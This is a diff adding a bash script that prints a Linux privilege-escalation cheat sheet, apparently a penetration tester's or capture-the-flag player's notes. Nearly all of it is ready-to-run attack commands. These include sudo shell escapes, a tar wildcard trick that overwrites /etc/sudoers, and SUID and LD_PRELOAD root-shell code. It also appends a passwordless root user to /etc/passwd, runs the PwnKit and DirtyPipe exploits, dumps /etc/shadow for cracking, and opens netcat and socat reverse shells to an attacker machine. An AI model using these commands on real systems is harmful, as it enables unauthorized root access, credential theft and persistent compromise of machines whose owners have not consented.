@@ -1,0 +1,405 @@
+#!/bin/bash
+echo '''
+=============================================================
+	Great repo
+=============================================================
+https://github.com/Ignitetechnologies/Linux-Privilege-Escalation
+https://sirensecurity.io/blog/linux-privilege-escalation-resources/
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+==============================================================
+	Various Capabilities
+==============================================================
+which gcc
+which cc
+which python
+which perl
+which wget
+which curl
+which fetch
+which nc
+which ncat
+which nc.traditional
+which socat
+______________________________
+Compilation? (Very Back Burner)
+What Arch?
+file /bin/bash
+
+uname -a
+cat /etc/*-release
+cat /etc/issue
+
+Kernel?
+uname -a
+
+Issue/Release?
+cat /etc/issue
+cat /etc/*-release
+______________________________
+# Are we a real user?
+sudo -l
+ls -lsaht /etc/sudoers
+______________________________
+# Web Configs containing credentials?
+cd /var/www/html/
+ls -lsaht
+
+# MYSQL Credentials? Root Unauthorized Access?
+mysql -uroot -p
+Enter Password:
+root : root
+root : toor
+root :
+______________________________
+# Where can I live on this machine? Where can I read, write and execute files?
+/var/tmp/
+/tmp/
+/dev/shm/
+
+# Any exotic file system mounts/extended attributes?
+cat /etc/fstab
+
+============================================================
+	Pspy  (  monitoring the system  )
+============================================================
+"SANDIP... Is privilege escalation going to come from some I/O file operations being done by some script on the system?"
+https://github.com/DominicBreuker/pspy/blob/master/README.md
+cd /var/tmp/
+File Transfer --> pspy32
+File Transfer --> pspy64
+chmod 755 pspy32 pspy64
+./pspy<32/64>
+
+==============================================================
+	Anything running in looback adapter ? 
+==============================================================
+netstat -antup
+netstat -tunlp
+
+# Is anything vulnerable running as root? '''; echo """
+ps aux |grep -i 'root' --color=auto
+
+===============================================================
+S1REN would take a quick look at etc to see if any user-level people did special things:
+===============================================================
+cd /etc/
+ls -lsaht
+Anything other than root here?
+• Any config files left behind?
+→ ls -lsaht |grep -i ‘.conf’ --color=auto
+
+• If we have root priv information disclosure - are there any .secret in /etc/ files?
+→ ls -lsaht |grep -i ‘.secret’ --color=auto
+
+SSH Keys I can use perhaps for even further compromise?
+ls -lsaR /home/
+
+# Quick look in:
+ls -lsaht /var/lib/
+ls -lsaht /var/db/
+
+# Quick look in:
+ls -lsaht /opt/
+ls -lsaht /tmp/
+ls -lsaht /var/tmp/
+ls -lsaht /dev/shm/
+
+File Transfer Capability? What can I use to transfer files?
+which wget
+which curl
+which nc
+which fetch (BSD)
+ls -lsaht /bin/ |grep -i 'ftp' --color=auto   
+
+==============================================================
+	env
+==============================================================
+env       < if this is writeable, 
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
+===============================================================
+	SSH Key
+===============================================================
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+===============================================================
+	Cron Jobs    ( == Use PSPY to detect cron jobs == )
+===============================================================
+cat /etc/exports
+crontab -l
+cat /etc/init.d
+cat /etc/cron.d 
+cat /etc/anacrontab
+cat /var/spool/cron
+cat /var/spool/cron/crontabs/root
+ls -alh /var/spool/cron;
+ls -al /etc/|grep cron
+./pspy64 -pf -i 1000
+______________________
+# cron job scripts:
+#!/usr/bin/python
+import os
+import sys
+
+try:
+	os.system('cp /bin/bash /tmp/bash;chmod u+s /tmp/bash;')
+except:
+	sys.exit()
+______________________
+# cron wildcards *  
+echo 'echo \"ignite ALL=(root) NOPASSWD: ALL\" > /etc/sudoers' > test.sh
+echo \"\" > \"--checkpoint-action=exec=sh test.sh\"
+echo "" > --checkpoint=1
+tar cf archive.tar *
+
+=====================================================================
+	SUIDs & GUIDs
+=====================================================================
+# SUIDs
+find / -perm -u=s -type f 2> /dev/null
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+
+# GUIDs
+find / -perm -g=s -type f 2> /dev/null
+
+# Create a SUID binary
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem(\"/bin/bash\");\n}' > /tmp/root.c   
+gcc -o /tmp/root /tmp/root.c  
+sudo chmod +x /tmp/root       # execute right
+sudo chmod +s /tmp/root       # setuid bit
+__________________________________
+# pkexec
+cd /tmp
+git clone https://github.com/berdav/CVE-2021-4034 pwnkit
+cd pwnkit
+make
+./cve-2021-4034
+
+=====================================================================
+	Capabilities
+=====================================================================
+getcap -r / 2> /dev/null
+python2.7-c 'import os; os.setuid(0); os.system(\"/bin/sh\")'
+perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'
+_______________
+tar cvf shadow.tar /etc/shadow
+ls
+tar -xvf shadow.tar
+crack the hash with hascat or john the ripper
+
+=====================================================================
+	sudo exploitation
+=====================================================================
+https://github.com/nongiach/sudo_inject
+# echo 0 > /proc/sys/kernel/yama/ptrace_scope
+# Don't worry this is not persistent accross reboot
+
+sudo whatever
+[sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
+sh exploit.sh or ./exploits.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+
+=====================================================================
+	sudo -l
+=====================================================================
+# Exploitable when a user have the following permissions (sudo -l)
+(ALL, !root) ALL
+
+# If you have a full TTY, you can exploit it like this
+sudo -u#-1 /bin/bash
+sudo -u#4294967295 id
+_____________________________________
+# Nmap 
+echo \"os.execute('/bin/bash')\" > /tmp/root.nse
+sudo nmap --script=/tmp/root.nse
+
+nmap --interactive
+!sh
+________________________________________
+gdb -nx -ex '!sh' -ex quit
+sudo mysql -e '! /bin/sh'
+strace -o /dev/null /bin/sh
+sudo awk 'BEGIN {system(\"/bin/sh\")}'
+sudo vim -c '!sh'
+sudo -u root vim -c '!sh'
+find /home -exec nc -lvp 4444 -e /bin/bash \;
+find /home -exec /bin/bash \;
+sudo perl -e 'exec \"/bin/bash\";'
+sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'
+________________
+sudo less /etc/hosts
+!bash
+________________
+sudo man man
+!bash
+________________
+sudo env /bin/bash
+________________
+sudo ftp
+! /bin/bash
+________________
+# in my kali
+socat file:\`tty\`,raw,echo=0 tcp-listen:1234
+# in victim
+sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<my_kali_ip>:1234
+________________
+Screen-4.5.00	https://www.exploit-db.com/exploits/41154/
+________________
+# in victim:
+sudo scp /etc/passwd my_kali_username@<my_kali_ip>:~/
+#in kali :
+echo 'siren:\$1$/UTMXpPC\$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> ~/passwd
+# in victim:
+sudo scp my_kali_username@<my_kali_ip>:~/passwd  /etc/passwd
+su siren                        i<3hacking
+_______________________________________
+# Wildcard    (   tar cf archive.tar *  )
+touch -- \"--checkpoint=1\"
+touch -- \"--checkpoint-action=exec=sh shell.sh\"
+echo \"#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag\" > shell.sh
+or
+echo \"#\!/bin/bash\ncp /bin/bash > /tmp/bash;chmod +s /tmp/bash;\" > shell.sh
+tar cf archive.tar *
+
+====================================================================
+	Writable files 
+====================================================================
+# Writable /etc/passwd
+echo 'siren:\$1$/UTMXpPC\$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
+su siren                        i<3hacking
+or
+echo 'dummy::0:0::/root:/bin/bash'>>/etc/passwd
+su -dummy
+NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd, also the /etc/shadow is renamed to /etc/spwd.db
+_____________________________________________
+# Writable /etc/sudoers
+echo \"username ALL=(ALL:ALL) ALL\">>/etc/sudoers
+echo \"username ALL=(ALL) NOPASSWD: ALL\" >>/etc/sudoers
+echo \"username ALL=NOPASSWD: /bin/bash\" >>/etc/sudoers
+_________________________________________
+#  List world writable files on the system.
+find / -writable ! -user \`whoami\` -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null
+
+=====================================================================
+ NFS Root Squashing    ( When no_root_squash appears in /etc/exports)
+=====================================================================
+cat /etc/exports
+no_root_squash?
+https://recipeforroot.com/attacking-nfs-shares/
+
+[On Attacking Machine]
+mkdir -p /mnt/nfs/
+mount -t nfs -o vers=<version 1,2,3> \$IP:<NFS Share> /mnt/nfs/ -nolock
+gcc suid.c -o suid
+cp suid /mnt/nfs/
+chmod u+s /mnt/nfs/suid
+su <user id matching target machine's user-level privilege.>
+
+[On Target Machine]
+user@host$ ./suid
+#
+
+=============================================================================
+LD_PRELOAD and NOPASSWD        (  Defaults        env_keep += LD_PRELOAD  )
+=====================================================================
+#include<stdio.h>#include<sys/types.h>#include<stdlib.h>#include<unistd.h>void_init() {
+	unsetenv(\"LD_PRELOAD\");
+	setgid(0);
+	setuid(0);
+	system(\"/bin/sh\");
+}
+
+Compile With   -->  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=<full_path_to_so_file> <program>
+e.g -
+sudo LD_PRELOAD=/tmp/shell.so find
+
+=====================================================================
+	Karnel Exploits
+=====================================================================
+# repo
+https://github.com/lucyoa/kernel-exploits/
+________________________________________
+# UDEV - Linux Kernel < 2.6 & UDEV < 1.4.1 - CVE-2009-1185 - April 2009
+Ubuntu 8.10  
+Ubunto 9.04  
+Gentoo  
+# RDS - Linux Kernel <= 2.6.36-rc8 - CVE-2010-3904 - Linux Exploit -
+Centos 4/5
+# perf_swevent_init - Linux Kernel < 3.8.9 (x86-64) - CVE-2013-2094 - June 2013
+Ubuntu 12.04.2  
+# mempodipper - Linux Kernel 2.6.39 < 3.2.2 (x86-64) - CVE-2012-0056 - January 2012
+Ubuntu 11.10
+Ubuntu 10.04  
+Redhat 6  
+Oracle 6  
+
+# Dirty Cow - Linux Kernel 2.6.22 < 3.2.0/3.13.0/4.8.3 - CVE-2016-5195 - October 2016
+Ubuntu 12.04
+Ubuntu 14.04
+Ubuntu 16.04
+
+# KASLR / SMEP - Linux Kernel < 4.4.0-83 / < 4.8.0-58 - CVE-2017-1000112 - August 2017
+Ubuntu 14.04
+Ubuntu 16.04
+_________________________________
+	DirtyPipe (CVE 2022-0847)
+__________________________________
+wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64
+chmod 777 traitor-amd64
+./traitor-amd64
+./traitor-amd64 --exploit kernel:CVE-2022-0847
+
+or
+
+git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
+cd CVE-2022-0847-DirtyPipe-Exploit
+./compile.sh
+./exploit
+
+===============================================================
+	Password Hunting
+===============================================================
+# find for PassWord
+grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null
+find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \;
+
+# In memory passwords
+strings /dev/mem -n10 | grep -i PASS
+
+# Find sensitive files
+locate password | more           
+cat /boot/grub/i386-pc/password.mod
+cat /etc/pam.d/common-password
+cat /etc/pam.d/gdm-password
+cat /etc/pam.d/gdm-password.original
+cat /lib/live/config/0031-root-password
+
+# Recursively searching for passwords is also a handy technique:
+grep -ri \"passw\" .
+
+===============================================================
+	Any mail? mbox in User \$HOME directory?
+===============================================================
+cd /var/mail/
+ls -lsaht
+____________________________
+Linpease:
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
+Traitor:
+https://github.com/liamg/traitor
+
+GTFOBins:
+https://gtfobins.github.io/
+
+PSpy32/Pspy64:
+https://github.com/DominicBreuker/pspy/blob/master/README.md """
